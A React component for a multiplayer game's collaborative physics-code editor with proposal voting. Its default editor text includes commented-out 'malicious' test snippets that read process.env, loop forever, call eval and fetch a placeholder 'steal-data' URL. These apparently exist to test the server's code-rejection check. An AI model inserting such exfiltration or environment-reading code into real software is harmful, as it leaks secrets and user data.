import React, { useState, useEffect, useRef } from "react";
import Editor from "@monaco-editor/react";
import "./CodeEditor.css";

function CodeEditor({ onSubmit, socket, roomId, playerName }) {
  const [code, setCode] = useState(
    `
    // nonMalicious: 
    // Create a "wind" effect based on position
    // const windStrength = Math.sin(Date.now() / 1000) * 0.2;
    // sphere.applyForce(windStrength, 0);

    // Create a "water" effect in the bottom third
    // if (sphere.y > world.height * 2/3) {
    //   sphere.vx *= 0.95;
    //   sphere.vy *= 0.95;
    //   sphere.applyForce(0, -0.15);
    // }

    // Create a "launcher" at the bottom center
    // if (Math.abs(sphere.x - world.width/2) < 50 && Math.abs(sphere.y - world.height) < 20) {
    //   sphere.applyForce(0, -3);
    // }

    // Create a "bounce zone" on the right side of the screen
    // if (sphere.x > world.width * 0.7) {
    //   world.setBounce(1.3);
   //    if (Math.abs(sphere.vx) < 5) {
    //     sphere.applyForce(sphere.vx > 0 ? 0.5 : -0.5, 0);
    //   }
    // } else {
    //   world.setBounce(0.8);
    // }

    // Reverse gravity in the bottom half of the screen
    // if (sphere.y > world.height / 2) {
    //   sphere.applyForce(0, -1);
    // }
  

  // malicious: 
    // Attempts to access Node.js server environment
    // const process = require('process');
    // console.log(process.env);

    // Infinite loop causing denial of service
    // while(true) {
    //   console.log("Looping forever");
    // }

    // Arbitrary code execution via eval
    // eval("console.log('This should be blocked')");

    // Attempting to send data to an external source
    // try {
    //   fetch('https://example.com/steal-data');
    // } catch(e) {}
  

  // mixed:
    // Legitimate physics code mixed with malicious elements
    // if (sphere.y > 300) {
    //   sphere.applyForce(0, -0.5); // Legitimate action
      
    //   // Malicious section
    //   try {
     //    fetch('https://example.com/steal-data');
    //   } catch(e) {}

      // More legitimate code
    //   if (sphere.x < 100) {
    //     sphere.applyForce(0.3, 0);
    //   }
    // }
  `
  );
  const [editorLoaded, setEditorLoaded] = useState(false);
  const [editorError, setEditorError] = useState(null);
  const [executionStatus, setExecutionStatus] = useState(null);
  const [voting, setVoting] = useState(null);
  const [userVote, setUserVote] = useState(null);
  const editorRef = useRef(null);
  const isUpdatingRef = useRef(false);

  // Initialize editor with current room code when joining
  useEffect(() => {
    if (socket) {
      const setupSocketListeners = () => {
        socket.on("codeEditorContent", (initialCode) => {
          setCode(initialCode);
        });

        // Listen for code updates from other users
        socket.on(
          "codeEditorUpdate",
          ({ code: updatedCode, cursorPosition, playerId }) => {
            if (updatedCode !== code) {
              isUpdatingRef.current = true;
              // Save current cursor position
              const currentPosition = editorRef.current?.getPosition();

              // Update code
              setCode(updatedCode);

              // If we have a reference to the editor, restore cursor
              if (editorRef.current) {
                // Delay to ensure the editor has updated with new text
                setTimeout(() => {
                  editorRef.current.setPosition(currentPosition);
                  isUpdatingRef.current = false;
                }, 10);
              } else {
                isUpdatingRef.current = false;
              }
            }
          }
        );

        // Listen for vote starting
        socket.on("voteStarted", (voteData) => {
          setVoting(voteData);
          setUserVote(null);
          setExecutionStatus({
            type: "voting",
            message: `${
              voteData.proposedBy
            } proposed code changes. Voting ends in ${Math.ceil(
              (voteData.votingEndTime - Date.now()) / 1000
            )}s`,
          });
        });

        // Listen for vote completion
        socket.on("voteCompleted", (result) => {
          setVoting(null);
          setUserVote(null);

          if (result.shouldExecute) {
            setExecutionStatus({
              type: "success",
              message: `Code approved (${result.upvotes} up, ${result.downvotes} down) and executed!`,
            });
          } else {
            setExecutionStatus({
              type: "error",
              message: `Code rejected (${result.upvotes} up, ${result.downvotes} down)`,
            });
          }

          // Clear status after a few seconds
          setTimeout(() => {
            setExecutionStatus(null);
          }, 5000);
        });

        // Listen for vote updates
        socket.on("voteUpdated", ({ votesUp, votesDown }) => {
          if (voting) {
            setVoting({
              ...voting,
              votesUp,
              votesDown,
            });
          }
        });

        // Listen for vote in progress (when joining)
        socket.on("voteInProgress", (voteData) => {
          setVoting(voteData);
          setExecutionStatus({
            type: "voting",
            message: `${
              voteData.proposedBy
            } proposed code changes. Voting ends in ${Math.ceil(
              (voteData.votingEndTime - Date.now()) / 1000
            )}s`,
          });
        });

        // Listen for code execution results
        socket.on("codeExecuted", ({ success, error, codeEntry }) => {
          if (success) {
            setExecutionStatus({
              type: "success",
              message: `Code executed successfully!`,
            });
          } else {
            setExecutionStatus({
              type: "error",
              message: `Error: ${error}`,
            });
          }

          // Clear status after a few seconds
          setTimeout(() => {
            setExecutionStatus(null);
          }, 5000);
        });

        // Listen for code rejection (security check failed)
        socket.on("codeRejected", ({ error }) => {
          setExecutionStatus({
            type: "error",
            message: `Code rejected: ${error}`,
          });

          // Clear status after a few seconds
          setTimeout(() => {
            setExecutionStatus(null);
          }, 5000);
        });

        // Listen for proposal rejection (e.g., another vote in progress)
        socket.on("proposalRejected", ({ error, votingEndTime }) => {
          let message = `Proposal rejected: ${error}`;
          if (votingEndTime) {
            message += `. Try again in ${Math.ceil(
              (votingEndTime - Date.now()) / 1000
            )}s`;
          }

          setExecutionStatus({
            type: "error",
            message,
          });

          // Clear status after a few seconds
          setTimeout(() => {
            setExecutionStatus(null);
          }, 5000);
        });

        // Listen for vote rejection
        socket.on("voteRejected", ({ error }) => {
          setExecutionStatus({
            type: "error",
            message: `Vote rejected: ${error}`,
          });

          // Clear status after a few seconds
          setTimeout(() => {
            setExecutionStatus(null);
          }, 3000);
        });

        // Listen for undo updates
        socket.on("codeUndone", ({ code: undoCode }) => {
          setCode(undoCode);
          setExecutionStatus({
            type: "info",
            message: "Reverted to previous code state",
          });

          // Clear status after a few seconds
          setTimeout(() => {
            setExecutionStatus(null);
          }, 3000);
        });
      };

      setupSocketListeners();

      // Cleanup function to remove listeners
      return () => {
        socket.off("codeEditorContent");
        socket.off("codeEditorUpdate");
        socket.off("voteStarted");
        socket.off("voteCompleted");
        socket.off("voteUpdated");
        socket.off("voteInProgress");
        socket.off("codeExecuted");
        socket.off("codeRejected");
        socket.off("proposalRejected");
        socket.off("voteRejected");
        socket.off("codeUndone");
      };
    }
  }, [socket, code]);

  // Update voting timer
  useEffect(() => {
    if (voting && voting.votingEndTime) {
      const timerInterval = setInterval(() => {
        const secondsLeft = Math.ceil(
          (voting.votingEndTime - Date.now()) / 1000
        );

        if (secondsLeft <= 0) {
          setExecutionStatus({
            type: "info",
            message: "Vote ended, processing results...",
          });
          clearInterval(timerInterval);
        } else {
          setExecutionStatus({
            type: "voting",
            message: `${voting.proposedBy} proposed code changes. Voting ends in ${secondsLeft}s`,
          });
        }
      }, 1000);

      return () => clearInterval(timerInterval);
    }
  }, [voting]);

  const handleEditorChange = (value) => {
    if (isUpdatingRef.current) return;

    setCode(value);

    // Broadcast changes to other users
    if (socket && roomId) {
      const cursorPosition = editorRef.current?.getPosition();
      socket.emit("codeEditorChange", {
        roomId,
        code: value,
        cursorPosition,
      });
    }
  };

  const handleEditorDidMount = (editor) => {
    editorRef.current = editor;
    setEditorLoaded(true);
  };

  const handleEditorError = (error) => {
    console.error("Monaco editor failed to load:", error);
    setEditorError(error);
  };

  const handleSubmit = () => {
    if (code.trim() && socket && roomId) {
      setExecutionStatus({
        type: "pending",
        message: "Proposing code for voting...",
      });

      // Propose code for voting
      socket.emit("proposeCode", {
        roomId,
        code,
        playerName,
      });
    }
  };

  const handleVote = (vote) => {
    if (!voting || userVote === vote) return;

    setUserVote(vote);

    // Submit vote
    socket.emit("submitVote", {
      roomId,
      vote,
    });
  };

  const handleUndo = () => {
    if (socket && roomId) {
      socket.emit("undoCode", { roomId });
    }
  };

  return (
    <div className="code-editor">
      <div className="editor-header">
        <div className="editor-title">
          <h3>Game Physics Editor</h3>
          <button
            onClick={handleUndo}
            className="undo-button"
            title="Undo to previous code state"
          >
            Undo
          </button>
        </div>
        <div className="editor-actions">
          {executionStatus && (
            <div className={`execution-status ${executionStatus.type}`}>
              {executionStatus.message}
            </div>
          )}

          {voting ? (
            <div className="voting-controls">
              <button
                className={`vote-button upvote ${
                  userVote === "upvote" ? "active" : ""
                }`}
                onClick={() => handleVote("upvote")}
                disabled={userVote === "upvote"}
              >
                ✓ Upvote ({voting.votesUp || 0})
              </button>
              <button
                className={`vote-button downvote ${
                  userVote === "downvote" ? "active" : ""
                }`}
                onClick={() => handleVote("downvote")}
                disabled={userVote === "downvote"}
              >
                ✗ Downvote ({voting.votesDown || 0})
              </button>
            </div>
          ) : (
            <button
              onClick={handleSubmit}
              className="submit-button"
              disabled={!!voting}
            >
              Propose Code
            </button>
          )}
        </div>
      </div>

      <div className="editor-container">
        {editorError ? (
          <div className="editor-fallback">
            <h4>Editor failed to load</h4>
            <textarea
              value={code}
              onChange={(e) => handleEditorChange(e.target.value)}
              placeholder="Write JavaScript code here..."
              rows={10}
            />
          </div>
        ) : (
          <Editor
            height="100%"
            defaultLanguage="javascript"
            value={code}
            onChange={handleEditorChange}
            theme="vs-dark"
            onMount={handleEditorDidMount}
            onError={handleEditorError}
            options={{
              minimap: { enabled: false },
              scrollBeyondLastLine: false,
              fontSize: 14,
              tabSize: 2,
              automaticLayout: true,
              wordWrap: "on",
              wrappingIndent: "indent",
              // Disable editing during voting
              readOnly: !!voting,
            }}
          />
        )}
      </div>

      <div className="editor-help">
        <p>
          Write JavaScript code to modify the game physics. Your code will run
          for each frame of the game after being approved by other players.
        </p>
        <div>
          <strong>Available objects:</strong>
          <ul>
            <li>
              <code>sphere</code> - Current player's ball
            </li>
            <li>
              <code>sphere.x</code>, <code>sphere.y</code> - Position
            </li>
            <li>
              <code>sphere.vx</code>, <code>sphere.vy</code> - Velocity
            </li>
            <li>
              <code>sphere.applyForce(x, y)</code> - Apply force to ball
            </li>
            <li>
              <code>sphere.setVelocity(x, y)</code> - Set velocity directly
            </li>
            <li>
              <code>world.gravity</code> - Current gravity value
            </li>
            <li>
              <code>world.setGravity(value)</code> - Change gravity
            </li>
            <li>
              <code>world.width</code>, <code>world.height</code> - Canvas
              dimensions
            </li>
          </ul>
        </div>
      </div>
    </div>
  );
}

export default CodeEditor;
